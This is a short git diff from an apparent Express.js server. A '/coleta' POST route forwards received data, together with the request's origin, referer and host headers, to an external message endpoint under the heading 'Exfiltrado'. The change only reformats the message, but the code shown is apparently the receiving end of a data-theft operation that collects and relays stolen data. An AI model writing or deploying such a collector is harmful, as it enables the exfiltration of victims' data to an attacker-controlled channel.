@@ -244,13 +244,13 @@ app.post('/coleta', async (req, res) => {
     },
     body: JSON.stringify({ content: `
 # Exfiltrado \n
-
 > **Origin**: ${req.headers?.origin ? req.headers.origin : 'Não especificado'}
 > **Refer**: ${req.headers?.refer ? req.headers.refer : 'Não especificado'}
 > **Host**: ${req.headers?.host ? req.headers.host : 'Não especificado'}
 > **Hostname**: ${req.headers?.hostname ? req.headers.hostname : 'Não especificado'}
 
-## Data: \n \`\`\`\n${JSON.stringify(data, null, 4)}\`\`\`` })
+## Data:
+\`\`\`\n${JSON.stringify(data, null, 4)}\`\`\`` })
   });
 
   res.status(204).end();
